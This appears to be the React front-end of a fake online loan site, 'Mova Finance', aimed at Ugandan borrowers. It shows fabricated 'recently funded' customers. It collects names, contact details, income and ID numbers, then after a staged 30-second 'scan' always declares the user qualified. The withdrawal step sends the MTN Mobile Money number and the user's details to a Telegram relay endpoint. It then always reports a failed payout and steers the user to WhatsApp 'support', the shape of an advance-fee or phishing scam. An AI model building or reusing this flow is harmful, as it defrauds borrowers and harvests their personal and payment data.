import { useEffect, useState } from 'react';
import {
  ArrowRight,
  Banknote,
  Check,
  CheckCircle2,
  ChevronRight,
  Clock3,
  FileText,
  MapPin,
  MessageCircle,
  Menu,
  ShieldCheck,
  Smartphone,
  Sparkles,
  User,
  X
} from 'lucide-react';

const USD_TO_UGX = 3750;

const loanModels = {
  personal: {
    type: 'personal',
    min: 10 * USD_TO_UGX,
    max: 1000 * USD_TO_UGX,
    label: 'UGX 37,500 - 3,750,000',
    apr: 7.5,
    description: 'For your plans'
  },
  business: {
    type: 'business',
    min: 3000 * USD_TO_UGX,
    max: 30000 * USD_TO_UGX,
    label: 'UGX 11,250,000 - 112,500,000',
    apr: 7.5,
    description: 'For your growth'
  }
};

const recentFundedLoans = [
  { name: 'A. Nsubuga', location: 'Kampala', type: 'Business loan', amount: 'UGX 18,000,000', phone: '+256 077*****42' },
  { name: 'M. Atim', location: 'Gulu', type: 'Personal loan', amount: 'UGX 1,500,000', phone: '+256 070*****18' },
  { name: 'J. Kato', location: 'Mbarara', type: 'Business loan', amount: 'UGX 27,500,000', phone: '+256 078*****63' },
  { name: 'R. Achieng', location: 'Jinja', type: 'Personal loan', amount: 'UGX 950,000', phone: '+256 075*****09' },
  { name: 'P. Mugisha', location: 'Fort Portal', type: 'Business loan', amount: 'UGX 12,800,000', phone: '+256 076*****31' },
  { name: 'S. Nabirye', location: 'Entebbe', type: 'Personal loan', amount: 'UGX 2,250,000', phone: '+256 074*****76' },
  { name: 'D. Okello', location: 'Lira', type: 'Business loan', amount: 'UGX 8,400,000', phone: '+256 077*****54' },
  { name: 'E. Namukasa', location: 'Masaka', type: 'Personal loan', amount: 'UGX 1,200,000', phone: '+256 070*****87' }
];

const initialApplicationModel = {
  applicant: {
    fullName: '',
    email: '',
    phone: '',
    city: '',
    businessName: '',
    loanPurpose: '',
    income: '',
    employmentStatus: '',
    employerName: '',
    idNumber: ''
  },
  loan: {
    type: 'business',
    amount: 20_000_000,
    term: 36,
    monthlyRepayment: 597_222
  }
};

const formatUgx = (value) => `UGX ${Number(value).toLocaleString('en-UG')}`;

const formatPhone = (rawNumber) => {
  const digits = String(rawNumber).replace(/\D/g, '').slice(0, 10);
  if (!digits) return '+256 *****';

  const prefix = digits.slice(0, 3);
  const suffix = digits.slice(-2);
  const maskLength = Math.max(digits.length - prefix.length - suffix.length, 3);
  const masked = '*'.repeat(maskLength);

  return `+256 ${prefix}${masked}${suffix}`;
};

const generatePhoneNumber = (index) => {
  const digits = String(700000000 + ((index + 12) * 3737) % 200000000).padStart(10, '0');
  return formatPhone(digits);
};

const firstNames = ['Aisha', 'Amina', 'Brian', 'Derrick', 'Esther', 'Grace', 'Isaac', 'Joan', 'Kevin', 'Lydia', 'Mariam', 'Nathan', 'Olivia', 'Peter', 'Rachel', 'Samuel', 'Sarah', 'Timothy', 'Winnie', 'Yusuf'];
const surnames = ['Achieng', 'Adong', 'Akello', 'Alupo', 'Anyango', 'Apio', 'Atim', 'Auma', 'Ayaa', 'Bafaki', 'Baluku', 'Bamweyana', 'Baryomunsi', 'Bataringaya', 'Batte', 'Bbosa', 'Bukenya', 'Bukirwa', 'Businge', 'Busingye', 'Byamugisha', 'Byaruhanga', 'Ddamulira', 'Ekirapa', 'Emiru', 'Gumisiriza', 'Habyarimana', 'Iga', 'Isingoma', 'Kabanda', 'Kabenge', 'Kabuye', 'Kagoda', 'Kakooza', 'Kalema', 'Kalyegira', 'Kamau', 'Kanyike', 'Kasule', 'Kato', 'Kavuma', 'Kayiwa', 'Kibuuka', 'Kiconco', 'Kigongo', 'Kintu', 'Kisakye', 'Kisekka', 'Kiyingi', 'Kobusingye', 'Kule', 'Lukwago', 'Lwanga', 'Mabirizi', 'Mafabi', 'Magenyi', 'Maitum', 'Matovu', 'Mawanda', 'Mayanja', 'Mbonye', 'Mirembe', 'Mugabi', 'Mugasha', 'Mugerwa', 'Mugisha', 'Mugume', 'Muhumuza', 'Mukasa', 'Mukarutinya', 'Mukiibi', 'Mulindwa', 'Mungai', 'Musoke', 'Mutebi', 'Mutyaba', 'Muwanga', 'Mwebaze', 'Mwine', 'Nabadda', 'Nabirye', 'Nabukenya', 'Nabwire', 'Nadiope', 'Nakato', 'Nakyobe', 'Nalukwago', 'Namagembe', 'Namakula', 'Nambi', 'Nambasa', 'Nansubuga', 'Nanyonga', 'Nanyunja', 'Nassuna', 'Nsubuga', 'Ntambi', 'Oboth', 'Odongo', 'Okello', 'Okwir', 'Oluka', 'Otim', 'Ssebuuma', 'Ssekandi', 'Ssenfuma'];

const people = Array.from({ length: 200 }, (_, index) => `${firstNames[Math.floor(index / surnames.length)]} ${surnames[index % surnames.length]}`);

const activity = {
  personal: people.slice(0, 100).map((name, index) => ({
    name,
    amount: loanModels.personal.min + ((index * 37500) % (loanModels.personal.max - loanModels.personal.min)),
    momo: generatePhoneNumber(index)
  })),
  business: people.slice(100).map((name, index) => ({
    name,
    amount: loanModels.business.min + ((index * 525000) % (loanModels.business.max - loanModels.business.min)),
    momo: generatePhoneNumber(index + 100)
  }))
};

function App() {
  const [loanType, setLoanType] = useState(initialApplicationModel.loan.type);
  const [mobileOpen, setMobileOpen] = useState(false);
  const [recentStart, setRecentStart] = useState(0);
  const [recentPopupIndex, setRecentPopupIndex] = useState(0);
  const [amount, setAmount] = useState(initialApplicationModel.loan.amount);
  const [term, setTerm] = useState(initialApplicationModel.loan.term);
  const [page, setPage] = useState('home');
  const [step, setStep] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('Preparing your application');
  const [form, setForm] = useState(initialApplicationModel.applicant);
  const [consentAccepted, setConsentAccepted] = useState(false);
  const [errors, setErrors] = useState({});
  const [mtnNumber, setMtnNumber] = useState('');
  const [postalNumber, setPostalNumber] = useState('');
  const [telegramConsentAccepted, setTelegramConsentAccepted] = useState(false);
  const [withdrawalConfirmed, setWithdrawalConfirmed] = useState(false);
  const [withdrawalError, setWithdrawalError] = useState('');

  const model = {
    loanType,
    range: loanModels[loanType],
    isBusiness: loanType === 'business',
    amount,
    term,
    monthly: Math.round((amount * (1 + loanModels[loanType].apr / 100)) / term),
    apr: loanModels[loanType].apr,
    applicant: form
  };

  const selectLoan = (type) => {
    setLoanType(type);
    setAmount((current) => Math.min(Math.max(current, loanModels[type].min), loanModels[type].max));
  };

  const handleChange = (event) => {
    const { name, value } = event.target;
    setForm((current) => ({ ...current, [name]: value }));
    setErrors((current) => ({ ...current, [name]: '' }));
  };

  const validateStep = () => {
    const nextErrors = {};
    const required = (name, label) => {
      if (!form[name].trim()) nextErrors[name] = `${label} is required.`;
    };

    if (step === 0) {
      required('fullName', 'Full name');
      required('email', 'Email');
      required('phone', 'Phone number');
      required('city', 'Location');
      if (form.email.trim() && !/^\S+@\S+\.\S+$/.test(form.email.trim())) nextErrors.email = 'Enter a valid email address.';
      if (form.phone.trim() && form.phone.replace(/\D/g, '').length < 9) nextErrors.phone = 'Enter a valid phone number.';
    }

    if (step === 1) {
      required('loanPurpose', 'Loan purpose');
      required(model.isBusiness ? 'businessName' : 'employmentStatus', model.isBusiness ? 'Business name' : 'Employment status');
      if (!model.isBusiness) required('employerName', 'Employer name');
      required('income', 'Monthly income');
    }

    if (step === 2) {
      required('idNumber', 'ID number');
      if (!consentAccepted) nextErrors.consent = 'You must accept the consent and terms.';
    }

    setErrors(nextErrors);
    return Object.keys(nextErrors).length === 0;
  };

  const handleContinue = () => {
    if (validateStep()) setStep((current) => Math.min(current + 1, 2));
  };

  const confirmWithdrawal = async () => {
    if (mtnNumber.replace(/\D/g, '').length < 9) {
      setWithdrawalError('Enter a valid MTN number to receive the funds.');
      return;
    }

    if (!postalNumber.trim()) {
      setWithdrawalError('Enter your postal number to continue.');
      return;
    }

    if (!telegramConsentAccepted) {
      setWithdrawalError('Please agree to share these details with Mova support.');
      return;
    }

    setWithdrawalError('');
    setLoadingMessage('Sending your details to Mova support');
    setIsLoading(true);

    try {
      const response = await fetch('/api/telegram/contact', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fullName: form.fullName,
          phone: form.phone,
          email: form.email,
          mtnNumber,
          postalNumber,
          loanType: model.isBusiness ? 'Business loan' : 'Personal loan',
          amount: model.amount
        })
      });

      if (!response.ok) {
        const result = await response.json().catch(() => ({}));
        throw new Error(result.error || 'We could not send your details.');
      }

      setWithdrawalConfirmed(true);
      setIsLoading(false);
      navigateToPage('withdrawalFailed', 'Processing withdrawal details');
    } catch (error) {
      setIsLoading(false);
      setWithdrawalError(error.message || 'We could not send your details. Please try again.');
    }
  };

  const navigateToPage = (nextPage, message = 'Preparing your application', delay = 700) => {
    setLoadingMessage(message);
    setIsLoading(true);
    window.setTimeout(() => {
      setPage(nextPage);
      setIsLoading(false);
      if (nextPage === 'application') {
        setStep(0);
      }
    }, delay);
  };

  useEffect(() => {
    const rotation = window.setInterval(() => {
      setRecentStart((current) => (current + 1) % recentFundedLoans.length);
      setRecentPopupIndex((current) => (current + 1) % recentFundedLoans.length);
    }, 4200);

    return () => window.clearInterval(rotation);
  }, []);

  const visibleRecentLoans = [0, 1, 2].map((offset) => recentFundedLoans[(recentStart + offset) % recentFundedLoans.length]);
  const recentPopupLoan = recentFundedLoans[recentPopupIndex];

  const renderHome = () => (
    <>
      <header className="site-header">
        <a className="brand" href="#home"><span className="brand-symbol">m</span><span>Mova Finance</span></a>
        <nav className={mobileOpen ? 'site-nav open' : 'site-nav'}>
          <a href="#loans" onClick={() => setMobileOpen(false)}>Loans</a>
          <a href="#why" onClick={() => setMobileOpen(false)}>Why Mova</a>
        </nav>
        <div className="header-actions">
          <button type="button" className="header-button" onClick={() => navigateToPage('application', 'Preparing your application')}>
            Apply now <ArrowRight size={15} />
          </button>
        </div>
        <button className="menu-button" onClick={() => setMobileOpen(!mobileOpen)} aria-label="Toggle menu">
          {mobileOpen ? <X size={21} /> : <Menu size={21} />}
        </button>
      </header>

      <main id="home">
        <section className="application-hero" id="loans">
          <div className="hero-panel">
            <div className="status-line"><span className="status-dot" /> MOVA FINANCE / FINANCING MADE SIMPLE</div>
            <h1>Finance the move<br /><span>ahead of you.</span></h1>
            <p>Choose the right loan, set your amount, and see an illustrative repayment before you share your details.</p>
            <div className="hero-actions">
              <button type="button" className="solid-button" onClick={() => navigateToPage('application', 'Calculating your loan options')}>
                Calculate my payment <ArrowRight size={16} />
              </button>
              <span className="hero-note"><ShieldCheck size={15} /> Secure application</span>
            </div>
            <div className="hero-figures">
              <div><strong>{model.apr}%</strong><span>Representative APR</span></div>
              <div><strong>2 min</strong><span>To see your range</span></div>
              <div><strong>UGX</strong><span>Local currency</span></div>
            </div>
          </div>

          <div className="application-card">
            <div className="card-topline"><span>Loan finder</span><span className="step-count">Personal or business</span></div>
            <h2>What are you<br /><em>planning?</em></h2>
            <p className="card-subtitle">Choose a loan type to see the range that fits.</p>
            <div className="loan-switcher">
              <button className={loanType === 'personal' ? 'switch-option selected' : 'switch-option'} onClick={() => selectLoan('personal')}>
                <Sparkles size={19} />
                <span><strong>Personal</strong><small>{loanModels.personal.description}</small></span>
                <Check size={17} />
              </button>
              <button className={loanType === 'business' ? 'switch-option selected' : 'switch-option'} onClick={() => selectLoan('business')}>
                <Banknote size={19} />
                <span><strong>Business</strong><small>{loanModels.business.description}</small></span>
                <Check size={17} />
              </button>
            </div>
            <div className="range-callout">
              <span>Available range</span>
              <strong>{model.range.label}</strong>
              <small>Flexible repayment terms • No obligation</small>
            </div>
            <div className="finder-amount">
              <div className="finder-amount-heading"><span>Amount you want to apply for</span><strong>{formatUgx(model.amount)}</strong></div>
              <input aria-label="Application amount" type="range" min={model.range.min} max={model.range.max} step="500" value={model.amount} onChange={(event) => setAmount(Number(event.target.value))} />
              <div className="range-labels"><span>{formatUgx(model.range.min)}</span><span>{formatUgx(model.range.max)}</span></div>
            </div>
            <div className="finder-term">
              <div className="finder-amount-heading"><span>Repayment period</span><strong>{term} months</strong></div>
              <div className="term-row">
                {[12, 24, 36, 48].map((option) => (
                  <button key={option} type="button" className={term === option ? 'term selected' : 'term'} onClick={() => setTerm(option)}>{option} months</button>
                ))}
              </div>
            </div>
            <button type="button" className="card-button" onClick={() => navigateToPage('application', 'Loading your loan form')}>Continue <ArrowRight size={16} /></button>
            <div className="card-foot"><ShieldCheck size={14} /> Illustrative estimate. Final offer follows verification.</div>
          </div>
        </section>

        <section className="proof-bar" id="why">
          <div className="proof-label">A better way to borrow</div>
          <div><Check size={17} /><strong>Clear from the start</strong><span>No confusing loan language</span></div>
          <div><Clock3 size={17} /><strong>Built for your time</strong><span>Quick, guided application</span></div>
          <div><Banknote size={17} /><strong>Made for Uganda</strong><span>Amounts in UGX</span></div>
        </section>

        <section className="recent-section" aria-labelledby="recent-heading">
          <div className="recent-heading">
            <div><span className="section-kicker">RECENT FUNDING</span><h2 id="recent-heading">Moves already<br /><em>in motion.</em></h2></div>
            <p>Illustrative recent loan activity from customers across Uganda. Names and numbers are masked for privacy.</p>
          </div>
          <div className="recent-grid">
            {visibleRecentLoans.map((loan) => (
              <article className="recent-card" key={`${loan.name}-${loan.amount}`}>
                <div className="recent-card-top"><span className="recent-check"><CheckCircle2 size={15} /></span><span>Funded</span></div>
                <strong>{loan.amount}</strong>
                <span>{loan.type}</span>
                <div className="recent-meta"><span>{loan.name} · {loan.location}</span><small>MoMo {loan.phone}</small></div>
              </article>
            ))}
          </div>
        </section>

      </main>

      <div className="recent-popup" role="status" aria-live="polite">
        <span className="recent-popup-icon"><CheckCircle2 size={16} /></span>
        <div><span>Recently funded</span><strong>{recentPopupLoan.name} received {recentPopupLoan.amount}</strong><small>{recentPopupLoan.location} · MoMo {recentPopupLoan.phone}</small></div>
      </div>

      <footer>
        <a className="brand" href="#home"><span className="brand-symbol">m</span><span>Mova Finance</span></a>
        <span>(c) 2026 Mova Finance</span>
        <span>Borrow thoughtfully. Move boldly.</span>
      </footer>
    </>
  );

  const renderApplication = () => {
    const stepTitles = ['Your details', 'Loan details', 'Verification'];
    const progress = ((step + 1) / 3) * 100;

    return (
      <div className="page-shell">
        <header className="site-header">
          <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
            <span className="brand-symbol">m</span><span>Mova Finance</span>
          </button>
          <div className="header-actions masthead-actions">
            <span className="pill-tag">Secure application</span>
            <button type="button" className="header-button" onClick={() => setPage('home')}>Back to home</button>
          </div>
        </header>

        <main className="application-page">
          <section className="page-banner">
            <div>
              <span className="eyebrow">Apply now</span>
              <h1>Finish your application in a few steps.</h1>
            </div>
            <div className="summary-box">
              <span>Selected offer</span>
              <strong>{model.isBusiness ? 'Business loan' : 'Personal loan'}</strong>
              <small>{formatUgx(model.amount)} • {model.term} months</small>
            </div>
          </section>

          <section className="wizard-shell">
            <aside className="side-summary">
              <div className="mini-card">
                <span>Estimated monthly repayment</span>
                <strong>{formatUgx(model.monthly)}</strong>
                <small>Representative APR {model.apr}%</small>
              </div>
              <div className="mini-card muted-card">
                <span>Available range</span>
                <strong>{model.range.label}</strong>
                <small>Simple online verification</small>
              </div>
            </aside>

            <div className="wizard-panel">
              <div className="stepper">
                {stepTitles.map((title, index) => (
                  <div key={title} className={index === step ? 'step-item active' : 'step-item'}>
                    <span>{index + 1}</span>
                    <small>{title}</small>
                  </div>
                ))}
              </div>
              <div className="progress-track"><span style={{ width: `${progress}%` }} /></div>

              <div className="wizard-content">
                {step === 0 && (
                  <div className="field-grid">
                    <label className="field"><span>Full name</span><input name="fullName" value={form.fullName} onChange={handleChange} aria-invalid={Boolean(errors.fullName)} />{errors.fullName && <small className="field-error">{errors.fullName}</small>}</label>
                    <label className="field"><span>Email</span><input type="email" name="email" value={form.email} onChange={handleChange} aria-invalid={Boolean(errors.email)} />{errors.email && <small className="field-error">{errors.email}</small>}</label>
                    <label className="field"><span>Phone number</span><input name="phone" value={form.phone} onChange={handleChange} aria-invalid={Boolean(errors.phone)} />{errors.phone && <small className="field-error">{errors.phone}</small>}</label>
                    <label className="field"><span>Location</span><input name="city" value={form.city} onChange={handleChange} aria-invalid={Boolean(errors.city)} />{errors.city && <small className="field-error">{errors.city}</small>}</label>
                  </div>
                )}

                {step === 1 && (
                  <div className="field-grid">
                    <label className="field"><span>Loan type</span><input value={model.isBusiness ? 'Business' : 'Personal'} readOnly /></label>
                    <div className="loan-amount-control">
                      <div className="loan-control-heading"><span>How much would you like?</span><strong>{formatUgx(model.amount)}</strong></div>
                      <input aria-label="Loan amount" type="range" min={model.range.min} max={model.range.max} step="500" value={model.amount} onChange={(event) => setAmount(Number(event.target.value))} />
                      <div className="range-labels"><span>{formatUgx(model.range.min)}</span><span>{formatUgx(model.range.max)}</span></div>
                    </div>
                    <div className="loan-amount-control">
                      <div className="loan-control-heading"><span>Repayment period</span><strong>{model.term} months</strong></div>
                      <div className="term-row">
                        {[12, 24, 36, 48].map((option) => (
                          <button key={option} type="button" className={model.term === option ? 'term selected' : 'term'} onClick={() => setTerm(option)}>
                            {option} months
                          </button>
                        ))}
                      </div>
                    </div>
                    <label className="field"><span>{model.isBusiness ? 'Business loan purpose' : 'Personal loan purpose'}</span><input name="loanPurpose" value={form.loanPurpose} onChange={handleChange} aria-invalid={Boolean(errors.loanPurpose)} />{errors.loanPurpose && <small className="field-error">{errors.loanPurpose}</small>}</label>
                    {model.isBusiness ? (
                      <label className="field"><span>Business name</span><input name="businessName" value={form.businessName} onChange={handleChange} aria-invalid={Boolean(errors.businessName)} />{errors.businessName && <small className="field-error">{errors.businessName}</small>}</label>
                    ) : (
                      <label className="field"><span>Employment status</span><input name="employmentStatus" value={form.employmentStatus} onChange={handleChange} aria-invalid={Boolean(errors.employmentStatus)} />{errors.employmentStatus && <small className="field-error">{errors.employmentStatus}</small>}</label>
                    )}
                    {!model.isBusiness && <label className="field"><span>Employer name</span><input name="employerName" value={form.employerName} onChange={handleChange} aria-invalid={Boolean(errors.employerName)} />{errors.employerName && <small className="field-error">{errors.employerName}</small>}</label>}
                    <label className="field"><span>Monthly income</span><input name="income" value={form.income} onChange={handleChange} aria-invalid={Boolean(errors.income)} />{errors.income && <small className="field-error">{errors.income}</small>}</label>
                  </div>
                )}

                {step === 2 && (
                  <div className="field-grid">
                    <label className="field"><span>ID number</span><input name="idNumber" value={form.idNumber} onChange={handleChange} aria-invalid={Boolean(errors.idNumber)} />{errors.idNumber && <small className="field-error">{errors.idNumber}</small>}</label>
                    <div className="field consent-field">
                      <span>Consent</span>
                      <label className="checkbox-row"><input type="checkbox" checked={consentAccepted} onChange={(event) => { setConsentAccepted(event.target.checked); setErrors((current) => ({ ...current, consent: '' })); }} /> <span>I agree to the loan terms and confirm the information provided is accurate and complete.</span></label>
                      {errors.consent && <small className="field-error">{errors.consent}</small>}
                    </div>
                  </div>
                )}
              </div>

              <div className="wizard-actions">
                <button type="button" className="secondary-button" disabled={step === 0} onClick={() => setStep((current) => Math.max(current - 1, 0))}>Back</button>
                {step < 2 ? (
                  <button type="button" className="primary-button" onClick={handleContinue}>Continue <ChevronRight size={16} /></button>
                ) : (
                  <button type="button" className="primary-button" onClick={() => { if (validateStep()) navigateToPage('review', 'Checking your application'); }}>
                    Review application <ChevronRight size={16} />
                  </button>
                )}
              </div>
            </div>
          </section>
        </main>
      </div>
    );
  };

  const renderReview = () => (
    <div className="page-shell">
      <header className="site-header">
        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
          <span className="brand-symbol">m</span><span>Mova Finance</span>
        </button>
        <div className="header-actions masthead-actions">
          <span className="pill-tag">Application review</span>
          <button type="button" className="header-button" onClick={() => setPage('application')}>Edit form</button>
        </div>
      </header>

      <main className="review-page">
        <section className="page-banner compact-banner">
          <div>
            <span className="eyebrow">Review details</span>
            <h1>Check everything before submitting.</h1>
          </div>
        </section>

        <section className="review-grid">
          <div className="review-card">
            <h3>Applicant information</h3>
            <ul>
              <li><User size={15} /> {form.fullName}</li>
              <li><Smartphone size={15} /> {form.phone}</li>
              <li><MapPin size={15} /> {form.city}</li>
              <li><FileText size={15} /> {form.email}</li>
            </ul>
          </div>

          <div className="review-card">
            <h3>Loan overview</h3>
            <ul>
              <li><Banknote size={15} /> {model.isBusiness ? 'Business loan' : 'Personal loan'}</li>
              <li><CheckCircle2 size={15} /> {formatUgx(model.amount)}</li>
              <li><Clock3 size={15} /> {model.term} month term</li>
              <li><ShieldCheck size={15} /> {formatUgx(model.monthly)} per month</li>
            </ul>
          </div>

          <div className="review-card review-card-wide">
            <h3>Agreement</h3>
            <p>I confirm the details above are accurate, and I understand that by submitting this application, I consent to a credit and affordability review.</p>
            <div className="checkbox-row"><input type="checkbox" checked={consentAccepted} onChange={(event) => setConsentAccepted(event.target.checked)} /> <span>I accept the Mova Finance consent and terms.</span></div>
          </div>
        </section>

        <div className="wizard-actions review-actions">
          <button type="button" className="secondary-button" onClick={() => navigateToPage('application', 'Loading your application form')}>Back</button>
          <button type="button" className="primary-button" disabled={!consentAccepted} onClick={() => navigateToPage('success', 'Scanning your information and checking eligibility', 30000)}>
            Submit application <ChevronRight size={16} />
          </button>
        </div>
      </main>
    </div>
  );

  const renderSuccess = () => (
    <div className="page-shell success-page-shell">
      <header className="site-header">
        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
          <span className="brand-symbol">m</span><span>Mova Finance</span>
        </button>
      </header>

      <main className="success-page">
        <div className="success-card">
          <div className="success-heading">
            <div className="success-badge"><CheckCircle2 size={35} /></div>
            <div><span className="eyebrow">Eligibility confirmed</span><h1>You qualify for a Mova loan.</h1></div>
          </div>
          <p className="success-intro">Thanks, {form.fullName.trim() ? form.fullName.trim().split(' ')[0] : 'there'}. Based on the information you provided, we can offer you the following {model.isBusiness ? 'business' : 'personal'} loan option.</p>
          <div className="success-offer">
            <div className="success-offer-top"><span>Eligible offer</span><strong><CheckCircle2 size={14} /> Qualified</strong></div>
            <div className="success-offer-main"><span>Loan amount</span><strong>{formatUgx(model.amount)}</strong></div>
            <div className="success-offer-grid">
              <div><span>Estimated monthly payment</span><strong>{formatUgx(model.monthly)}</strong></div>
              <div><span>Repayment term</span><strong>{model.term} months</strong></div>
              <div><span>Representative APR</span><strong>{model.apr}%</strong></div>
            </div>
          </div>
          <div className="success-next">
            <strong>What happens next</strong>
            <span><Check size={14} /> A Mova advisor will contact you to confirm the final details.</span>
            <span><Check size={14} /> Funds are released after final verification and agreement.</span>
          </div>
          <div className="withdrawal-panel">
            <div><span className="eyebrow">MTN Mobile Money</span><h3>Where should we send your funds?</h3></div>
            <label className="field"><span>MTN number</span><input inputMode="tel" placeholder="07XX XXX XXX" value={mtnNumber} onChange={(event) => { setMtnNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={Boolean(withdrawalError)} />{withdrawalError && <small className="field-error">{withdrawalError}</small>}</label>
            <label className="field"><span>Postal number</span><input inputMode="numeric" placeholder="Enter postal number" value={postalNumber} onChange={(event) => { setPostalNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} /></label>
            <label className="checkbox-row withdrawal-consent"><input type="checkbox" checked={telegramConsentAccepted} onChange={(event) => { setTelegramConsentAccepted(event.target.checked); setWithdrawalError(''); }} /> <span>I agree to share these details with Mova Finance support through Telegram so they can contact me.</span></label>
            <button type="button" className="primary-button" onClick={confirmWithdrawal}>{withdrawalConfirmed ? 'Withdrawal details confirmed' : 'Confirm withdrawal details'} <Check size={16} /></button>
          </div>
          <p className="success-disclaimer">This is an eligibility result, not a final disbursement approval. Your final offer may be subject to verification.</p>
          <div className="wizard-actions review-actions">
            <button type="button" className="secondary-button" onClick={() => navigateToPage('home', 'Returning home')}>Back home</button>
            <button type="button" className="primary-button" onClick={() => navigateToPage('application', 'Starting a new application')}>Apply again</button>
          </div>
        </div>
      </main>
    </div>
  );

  const renderWithdrawalFailed = () => (
    <div className="page-shell success-page-shell">
      <header className="site-header">
        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
          <span className="brand-symbol">m</span><span>Mova Finance</span>
        </button>
        <div className="header-actions masthead-actions"><span className="pill-tag">Support needed</span></div>
      </header>

      <main className="success-page">
        <div className="success-card failure-card">
          <div className="failure-badge">!</div>
          <span className="eyebrow">Withdrawal could not be completed</span>
          <h1>Your loan is still qualified.</h1>
          <p className="success-intro">We could not complete the MTN withdrawal with the details provided. Your eligibility result is still active, so our support team can help you finish the payout.</p>
          <div className="support-panel">
            <strong>Contact Mova support</strong>
            <span>Share your application details with our team and we will help resolve the withdrawal issue.</span>
            <a className="whatsapp-button" href="https://wa.me/256700000000?text=Hello%20Mova%20Finance%2C%20I%20need%20help%20with%20my%20qualified%20loan%20withdrawal." target="_blank" rel="noreferrer"><MessageCircle size={17} /> Chat with support on WhatsApp</a>
          </div>
          <div className="wizard-actions review-actions">
            <button type="button" className="secondary-button" onClick={() => navigateToPage('success', 'Returning to your offer')}>Back to offer</button>
            <button type="button" className="primary-button" onClick={() => navigateToPage('home', 'Returning home')}>Back home</button>
          </div>
        </div>
      </main>
    </div>
  );

  return (
    <div className="site-shell">
      {isLoading && (
        <div className="loading-overlay" role="status" aria-live="polite" aria-busy="true">
          <div className="loading-panel">
            <div className="loading-header">
              <div className="loading-brand" aria-label="Mova Finance">
                <span className="brand-symbol">m</span>
                <span>Mova Finance</span>
              </div>
              <span className="security-badge">Secure review</span>
            </div>
            <div className="spinner-wrap">
              <div className="spinner" aria-hidden="true" />
            </div>
            <div className="loading-text">{loadingMessage}</div>
            <div className="loading-progress" aria-hidden="true">
              <span />
            </div>
          </div>
        </div>
      )}
      {page === 'home' && renderHome()}
      {page === 'application' && renderApplication()}
      {page === 'review' && renderReview()}
      {page === 'success' && renderSuccess()}
      {page === 'withdrawalFailed' && renderWithdrawalFailed()}
    </div>
  );
}

export default App;
